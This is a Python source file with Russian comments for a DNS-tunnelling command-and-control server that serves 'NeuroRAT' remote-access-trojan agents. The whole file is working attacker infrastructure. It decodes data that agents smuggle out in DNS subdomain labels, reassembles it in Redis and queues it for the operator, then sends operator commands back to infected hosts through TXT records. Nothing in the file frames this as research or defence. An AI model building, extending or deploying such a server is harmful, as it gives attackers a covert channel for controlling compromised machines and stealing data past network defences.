#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DNS Tunnel Server
=================

Обрабатывает DNS-запросы от агентов NeuroRAT, используя DNS-туннелирование.
Декодирует данные, полученные от агентов, и отправляет команды через TXT-записи.
"""

import os
import sys
import time
import base64
import binascii
import logging
import json
from socketserver import UDPServer, BaseRequestHandler
from typing import Dict, Optional, Tuple, List
import redis

try:
    from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, RR, TXT, A
    from dnslib.server import DNSLogger
except ImportError:
    print("Библиотека dnslib не найдена. Установите ее: pip install dnslib")
    sys.exit(1)

# Настройка логирования
log_level = os.getenv("LOG_LEVEL", "INFO").upper()
log_format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
logging.basicConfig(level=log_level, format=log_format)
logger = logging.getLogger("dns_server")

# --- Конфигурация ---
C2_DOMAIN = os.getenv("C2_DOMAIN", "neurorat.com") # Домен C2, который настроен на этот сервер
LISTEN_IP = os.getenv("DNS_LISTEN_IP", "0.0.0.0")
LISTEN_PORT = int(os.getenv("DNS_LISTEN_PORT", 53))
DEFAULT_TTL = 60

# --- Хранилище состояний (заменить на Redis/DB в реальной системе) ---
# {session_id: {seq: chunk_data}}
# incoming_data_buffers: Dict[str, Dict[int, str]] = {}
# {session_id: total_chunks} - для отслеживания полноты сборки
# incoming_data_expected_chunks: Dict[str, Optional[int]] = {}
# {session_id: last_activity_time}
# incoming_data_timestamps: Dict[str, float] = {}

# {session_id: [command_chunk1, command_chunk2]}
outgoing_command_queue: Dict[str, List[str]] = {} # Пока оставляем в памяти
# {session_id: next_chunk_index} - для отправки по частям
outgoing_command_indices: Dict[str, int] = {} # Пока оставляем в памяти
# {session_id: last_activity_time}
outgoing_command_timestamps: Dict[str, float] = {} # Пока оставляем в памяти

# Максимальное время хранения буферов/очередей в памяти/Redis (секунды)
BUFFER_TIMEOUT = 3600 # 1 час

# --- Redis Connection ---
REDIS_URL = os.getenv('REDIS_URL', 'redis://localhost:6379/1') # Используем другую БД? Или префикс?
redis_client: Optional[redis.Redis] = None
try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
    redis_client.ping()
    logger.info(f"DNS Server connected to Redis at {REDIS_URL}")
except redis.exceptions.ConnectionError as e:
    logger.error(f"DNS Server failed to connect to Redis at {REDIS_URL}: {e}. Работа с Redis будет невозможна.")
    redis_client = None
except Exception as e:
    logger.error(f"Неожиданная ошибка при подключении к Redis: {e}. Работа с Redis будет невозможна.")
    redis_client = None

# Префиксы ключей Redis
INCOMING_PREFIX = "dns:incoming:"
OUTGOING_PREFIX = "dns:outgoing:"
C2_INCOMING_QUEUE = "c2:incoming_messages" # Очередь для C2
C2_NOTIFICATION_CHANNEL = "c2:new_message_notify" # Канал для уведомления C2

class DNSHandler(BaseRequestHandler):
    """Обработчик DNS-запросов"""

    def handle(self):
        try:
            data, sock = self.request
            request = DNSRecord.parse(data)
            request_qname = str(request.q.qname).lower().rstrip('.')
            
            logger.debug(f"Получен запрос: {request_qname} от {self.client_address}")

            reply = self._handle_request(request, request_qname)
            
            if reply:
                sock.sendto(reply.pack(), self.client_address)
                logger.debug(f"Отправлен ответ на {request_qname} для {self.client_address}")

        except Exception as e:
            logger.error(f"Ошибка обработки DNS-запроса: {e}", exc_info=True)

    def _handle_request(self, request: DNSRecord, qname: str) -> Optional[DNSRecord]:
        """Основная логика обработки запроса"""
        reply = request.reply()
        
        # Проверяем, относится ли запрос к нашему C2 домену
        if not qname.endswith(f".{C2_DOMAIN}"):
            # Не наш домен - можем проксировать или просто игнорировать
            logger.debug(f"Запрос к чужому домену: {qname}. Игнорируем.")
            # reply.header.rcode = RCODE.NXDOMAIN # Или REFUSED?
            return None # Не отвечаем на чужие запросы

        # Извлекаем поддоменную часть
        subdomain_part = qname[:-len(C2_DOMAIN)-1] # Убираем точку и домен C2
        parts = subdomain_part.split('.')

        # Формат для данных от агента: {seq}.{chunk}.{session_id}
        # Формат для завершения передачи: done.{seq_count}.{session_id}
        # Формат для поллинга команд: poll.{session_id}
        
        if len(parts) == 3 and parts[0].isalnum() and parts[2].isalnum():
            # Похоже на данные от агента
            seq_hex, chunk_b32, session_id = parts
            logger.info(f"[DATA] Session: {session_id}, Seq: {seq_hex}, Chunk: {chunk_b32[:10]}..." )
            
            if not redis_client:
                logger.error("Нет подключения к Redis, невозможно обработать данные от агента.")
                # Можно ответить ошибкой? Пока просто NOERROR
                reply.header.rcode = 0 
                return reply

            try:
                seq = int(seq_hex, 16)
            except ValueError:
                logger.warning(f"[DATA] Invalid sequence number: {seq_hex} for session {session_id}. Ignoring.")
                return None # Не отвечаем на некорректные пакеты

            # Декодируем base32 чанк
            try:
                # Base32 может требовать padding. Добавим его, если нужно.
                padding = '=' * (-len(chunk_b32) % 8)
                decoded_chunk = base64.b32decode(chunk_b32.upper() + padding) # base32 обычно в upper case
            except (binascii.Error, ValueError) as e:
                logger.warning(f"[DATA] Failed to decode base32 chunk for session {session_id}, seq {seq}: {e}. Chunk: {chunk_b32}")
                return None
                
            # Добавляем чанк в Redis HASH
            redis_key = f"{INCOMING_PREFIX}{session_id}"
            try:
                # Используем HSET для добавления/обновления поля (seq) в хеше
                redis_client.hset(redis_key, str(seq), decoded_chunk)
                # Устанавливаем/обновляем TTL для ключа
                redis_client.expire(redis_key, BUFFER_TIMEOUT)
                logger.debug(f"Chunk {seq} for session {session_id} saved to Redis.")
            except redis.exceptions.RedisError as e:
                logger.error(f"Redis error saving chunk for session {session_id}: {e}")
                # Не отвечаем клиенту или отвечаем ошибкой?
                reply.header.rcode = 0 # Пока NOERROR
                return reply

            # TODO: Проверить полноту данных и передать собранное сообщение в C2 (через Redis?)
            # Нужен механизм, чтобы агент сообщил общее количество чанков или отправил маркер конца
            # Пока просто собираем
            
            # Отвечаем NOERROR без данных
            reply.header.rcode = 0 # NOERROR

        elif len(parts) == 3 and parts[0] == "done" and parts[1].isdigit() and parts[2].isalnum():
            # Похоже на сигнал завершения передачи данных
            _, seq_count_str, session_id = parts
            logger.info(f"[DONE] Session: {session_id} signals completion with {seq_count_str} chunks.")

            if not redis_client:
                logger.error("Нет подключения к Redis, невозможно обработать сигнал завершения.")
                reply.header.rcode = 0 
                return reply

            redis_key = f"{INCOMING_PREFIX}{session_id}"
            try:
                # Получаем все чанки из Redis HASH
                all_chunks_map = redis_client.hgetall(redis_key)
                received_count = len(all_chunks_map)
                expected_count = int(seq_count_str)

                if received_count < expected_count:
                    logger.warning(f"[DONE] Session: {session_id} - Received {received_count} chunks, but expected {expected_count}. Data incomplete.")
                    # Можно не удалять ключ, дать агенту шанс дослать?
                    # Или удалить и сообщить об ошибке?
                    # Пока просто логируем и отвечаем NOERROR
                    reply.header.rcode = 0
                elif received_count > expected_count:
                     logger.warning(f"[DONE] Session: {session_id} - Received {received_count} chunks, but expected {expected_count}. Potential duplicates? Processing anyway.")
                     # Продолжаем обработку

                if received_count >= expected_count:
                    # Собираем сообщение
                    assembled_message = ""
                    try:
                        # Сортируем по seq (ключи хеша - строки)
                        sorted_keys = sorted(all_chunks_map.keys(), key=int)
                        for seq_key in sorted_keys:
                            # Данные хранятся как строки после decode('utf-8') ранее?
                            # Если хранили как bytes, то нужно decode здесь
                            # Предположим, что хранили как строки
                            assembled_message += all_chunks_map[seq_key]
                        
                        logger.info(f"[DONE] Session: {session_id} - Assembled message ({len(assembled_message)} chars). Pushing to C2 queue.")
                        
                        # Помещаем собранное сообщение в очередь C2
                        message_payload = json.dumps({"session_id": session_id, "data": assembled_message, "timestamp": time.time()})
                        redis_client.rpush(C2_INCOMING_QUEUE, message_payload)
                        
                        # Опционально: Уведомляем C2 через Pub/Sub
                        redis_client.publish(C2_NOTIFICATION_CHANNEL, session_id)
                        
                        # Удаляем ключ с чанками из Redis
                        redis_client.delete(redis_key)
                        logger.debug(f"[DONE] Session: {session_id} - Redis key {redis_key} deleted.")
                        reply.header.rcode = 0 # Успех
                        
                    except Exception as e:
                        logger.error(f"[DONE] Session: {session_id} - Error assembling/pushing message: {e}", exc_info=True)
                        reply.header.rcode = 2 # SERVFAIL
                
            except redis.exceptions.RedisError as e:
                logger.error(f"[DONE] Session: {session_id} - Redis error: {e}")
                reply.header.rcode = 2 # SERVFAIL
            except ValueError:
                 logger.warning(f"[DONE] Invalid sequence count: {seq_count_str} for session {session_id}. Ignoring.")
                 reply.header.rcode = 1 # FORMERR

        elif len(parts) == 2 and parts[0] == "poll":
            # Похоже на запрос команд
            _, session_id = parts
            logger.info(f"[POLL] Session: {session_id} запрашивает команды")
             
            # Получаем следующую команду из очереди Redis
            command_to_send = None
            redis_key = f"{OUTGOING_PREFIX}{session_id}"
            if redis_client:
                try:
                    # Используем LPOP для получения и удаления первого элемента списка
                    command_to_send = redis_client.lpop(redis_key)
                    if command_to_send:
                        logger.info(f"[POLL] Получена команда из Redis для сессии {session_id}. Отправляем.")
                        # Обновляем TTL ключа, чтобы он не пропал, пока команда отправляется
                        redis_client.expire(redis_key, BUFFER_TIMEOUT, nx=True) # nx=True - только если TTL не установлен
                    else:
                        logger.debug(f"[POLL] Нет команд в Redis для сессии {session_id}")
                        reply.header.rcode = 0 # NOERROR без данных
                except redis.exceptions.RedisError as e:
                    logger.error(f"[POLL] Redis error getting command for session {session_id}: {e}")
                    reply.header.rcode = 0 # Отвечаем NOERROR без данных при ошибке Redis
            else:
                logger.error("Нет подключения к Redis, невозможно получить команды для агента.")
                reply.header.rcode = 0 # Отвечаем NOERROR без данных

            # Если есть команда для отправки - формируем TXT ответ
            if command_to_send:
                # Команда уже должна быть base64 и разбита на чанки при добавлении в очередь
                # Убедимся, что чанк не пустой
                if isinstance(command_to_send, str) and command_to_send:
                    # dnslib ожидает байты или список байт/строк
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT([command_to_send.encode('ascii')]), ttl=DEFAULT_TTL))
                    # TTL для Redis ключа уже обновлен выше
                else:
                    # Пустой или некорректный чанк - отвечаем NOERROR без данных
                    logger.warning(f"[POLL] Обнаружен пустой или некорректный чанк команды для сессии {session_id}")
                    reply.header.rcode = 0
             
        else:
            # Неизвестный формат поддомена
            logger.warning(f"Неизвестный формат запроса: {qname}")
            reply.header.rcode = 3 # NXDOMAIN
            
        return reply

# --- Функция очистки старых буферов --- 
def cleanup_buffers():
    """Периодически удаляет старые буферы/очереди из памяти"""
    # Эта функция больше не нужна для входящих данных (управляется TTL Redis)
    # Оставляем пока для очистки исходящей очереди в памяти
    while True:
        now = time.time()
        expired_outgoing_sessions = [
            sid for sid, ts in outgoing_command_timestamps.items()
            if now - ts > BUFFER_TIMEOUT
        ]
        for sid in expired_outgoing_sessions:
            if sid in outgoing_command_queue: del outgoing_command_queue[sid]
            if sid in outgoing_command_indices: del outgoing_command_indices[sid]
            if sid in outgoing_command_timestamps: del outgoing_command_timestamps[sid]
            logger.info(f"Удалена истекшая очередь команд для сессии {sid}")

        time.sleep(BUFFER_TIMEOUT / 2) # Проверяем каждые полчаса

def main():
    logger.info(f"Запуск DNS сервера для домена '{C2_DOMAIN}' на {LISTEN_IP}:{LISTEN_PORT}")
    
    # Используем простой UDP сервер
    # Для продакшена может потребоваться более производительное решение (asyncio, twisted)
    try:
        # Запускаем поток для очистки буферов
        import threading
        cleanup_thread = threading.Thread(target=cleanup_buffers, daemon=True)
        cleanup_thread.start()
        logger.info("Запущен поток очистки буферов.")

        server = UDPServer((LISTEN_IP, LISTEN_PORT), DNSHandler)
        logger.info("Сервер запущен. Нажмите Ctrl+C для остановки.")
        server.serve_forever()
    except PermissionError:
        logger.critical(f"Ошибка прав доступа: Не удалось запустить сервер на порту {LISTEN_PORT}. Требуются права root/администратора.")
    except Exception as e:
        logger.critical(f"Критическая ошибка запуска DNS сервера: {e}", exc_info=True)
    finally:
        logger.info("DNS сервер остановлен.")

if __name__ == '__main__':
    main() 